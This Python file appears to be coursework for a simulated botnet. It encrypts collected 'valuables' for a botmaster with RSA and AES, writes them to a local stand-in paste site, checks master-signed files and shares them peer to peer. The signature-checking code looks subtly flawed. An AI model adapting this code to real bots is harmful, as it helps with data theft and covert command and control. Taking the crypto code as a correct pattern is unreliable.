import os

#Import for RSA-AES Hybrid Encryption
from Crypto import Random
from Crypto.Cipher import AES
from Crypto.Util import Counter
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Signature import PKCS1_v1_5
from Crypto.Hash import SHA256
#AES.key_size = (16,24,32)
AES256_KEYSIZE_BYTES = AES.key_size[2]

# Instead of storing files on disk,
# we'll save them in memory for simplicity
filestore = {}
# Valuable data to be sent to the botmaster
valuables = []

###

def save_valuable(data):
    valuables.append(data)

def encrypt_for_master(data):
#################################################
    public_key_text = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApIxHCL6eEHrpH9fkwHnm
+wgSmqQ3TCUo54doPGMjagDH933KeNtFbRepEJ8BvhscJxFKSuBaCWw6DymiYbPT
B2uffJOzdfGS4N3ob5CP6efjiZ1uVE7qli4Ajt5huBXJq7Y742Px/qpxg6T3lQeJ
OM01eIbhF5vrtSu1mNhdZ4pbDH+qVZMbo60KPdcnaoG9Kxuz5aLcqy2MeaDVBeeW
iSNiDcebkJLzyc34faAwOoPEYIlXjU6TQSjnfj+zkEkSsGE0MB4ockYGB0YTXwR0
Y6lZJ7Ayk+vtjOlDeZdEqcpdkt3dCrKMCN4v19ppg2pHZuYiBfM7K3BNlT3RsMr+
QQIDAQAB
-----END PUBLIC KEY-----"""
#################################################

    # Encrypt the file so it can only be read by the bot master

#-------------------------------------------------------------------
#1. Setup AES Stuff
    # 8 byte (64bit) nonce/iv for CTR mode counter prefix.
    iv = Random.new().read(8)
    #Randomly generate 32 byte (256bit) symmetric encryption key.
    symmetric_key = Random.new().read(AES256_KEYSIZE_BYTES)
    # Instantiate a 128bit counter object for CTR mode of operation.
    # 64bits of counter, 64bits of prefix
    counter = Counter.new(64, prefix=iv)


#-------------------------------------------------------------------
#2. AES Encryption of Data
    # Encrypt our data with AES/CTR mode of operation
    aes_cipher = AES.new(symmetric_key, AES.MODE_CTR, counter=counter)
    aes_ciphertext = aes_cipher.encrypt(data)


#-------------------------------------------------------------------
#3. Setup RSA/Asymmetric Stuff
    # The Bot gets the BotMaster's public key
    # And creates a RSA public key object
#Importkey?
    rsa_public_key = RSA.importKey(public_key_text)


#-------------------------------------------------------------------
#4. PKCS1_OAEP Encryption of Key
    # New PKCS1_OAEP cipher instance with RSA public key
    pkcs1_cipher = PKCS1_OAEP.new(rsa_public_key)
#Hash random key???
    # Encrypted symmetric key using PKCS1_OAEP 
    pkcs1_ciphertext = pkcs1_cipher.encrypt(symmetric_key)


#-------------------------------------------------------------------
#5. Return asymmetric ciphertext + Iv + symmetric ciphetext
    return pkcs1_ciphertext + iv + aes_ciphertext

def upload_valuables_to_pastebot(fn):
    # Encrypt the valuables so only the bot master can read them
    valuable_data = "\n".join(valuables)
    valuable_data = bytes(valuable_data, "ascii")
    encrypted_master = encrypt_for_master(valuable_data)

    # "Upload" it to pastebot (i.e. save in pastebot folder)
    f = open(os.path.join("pastebot.net", fn), "wb")
    f.write(encrypted_master)
    f.close()

    print("Saved valuables to pastebot.net/%s for the botnet master" % fn)

###

def verify_file(f):
    # Verify the file was sent by the bot master
    # TODO: For Part 2, you'll use public key crypto here
    # Naive verification by ensuring the first line has the "passkey"

#################################################
    public_key_text = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEApIxHCL6eEHrpH9fkwHnm
+wgSmqQ3TCUo54doPGMjagDH933KeNtFbRepEJ8BvhscJxFKSuBaCWw6DymiYbPT
B2uffJOzdfGS4N3ob5CP6efjiZ1uVE7qli4Ajt5huBXJq7Y742Px/qpxg6T3lQeJ
OM01eIbhF5vrtSu1mNhdZ4pbDH+qVZMbo60KPdcnaoG9Kxuz5aLcqy2MeaDVBeeW
iSNiDcebkJLzyc34faAwOoPEYIlXjU6TQSjnfj+zkEkSsGE0MB4ockYGB0YTXwR0
Y6lZJ7Ayk+vtjOlDeZdEqcpdkt3dCrKMCN4v19ppg2pHZuYiBfM7K3BNlT3RsMr+
QQIDAQAB
-----END PUBLIC KEY-----"""
#################################################

#-------------------------------------------------------------------
    #take Signature length of bytesfrom the file
    # 256, 2048 bits
    signature = f[256:]

#-------------------------------------------------------------------
    # Create as RSA Key Object by importing the public key
    # pubkey_txt is hard coded, for now
    rsa_public_key = RSA.importKey(public_key_text)

#-------------------------------------------------------------------
    # Get the remaining bytes of the file...
    h = SHA256.new(f[:256])

#-------------------------------------------------------------------
    # Instantiate a PKCS1_v1_5 with the public key
    pksc1 = PKCS1_v1_5.new(rsa_public_key)

#-------------------------------------------------------------------
    # Returns the boolean from the verification...
    return pksc1.verify(h, signature)


def process_file(fn, f):
    if verify_file(f):
        # If it was, store it unmodified
        # (so it can be sent to other bots)
        # Decrypt and run the file
        filestore[fn] = f
        print("Stored the received file as %s" % fn)
    else:
        print("The file has not been signed by the botnet master")

def download_from_pastebot(fn):
    # "Download" the file from pastebot.net
    # (i.e. pretend we are and grab it from disk)
    # Open the file as bytes and load into memory
    if not os.path.exists(os.path.join("pastebot.net", fn)):
        print("The given file doesn't exist on pastebot.net")
        return
    f = open(os.path.join("pastebot.net", fn), "rb").read()
    process_file(fn, f)

def p2p_download_file(sconn):
    # Download the file from the other bot
    fn = str(sconn.recv(), "ascii")
    f = sconn.recv()
    print("Receiving %s via P2P" % fn)
    process_file(fn, f)

###

def p2p_upload_file(sconn, fn):
    # Grab the file and upload it to the other bot
    # You don't need to encrypt it only files signed
    # by the botnet master should be accepted
    # (and your bot shouldn't be able to sign like that!)
    if fn not in filestore:
        print("That file doesn't exist in the botnet's filestore")
        return
    print("Sending %s via P2P" % fn)
    sconn.send(fn)
    sconn.send(filestore[fn])

def run_file(f):
    # If the file can be run,
    # run the commands
    pass
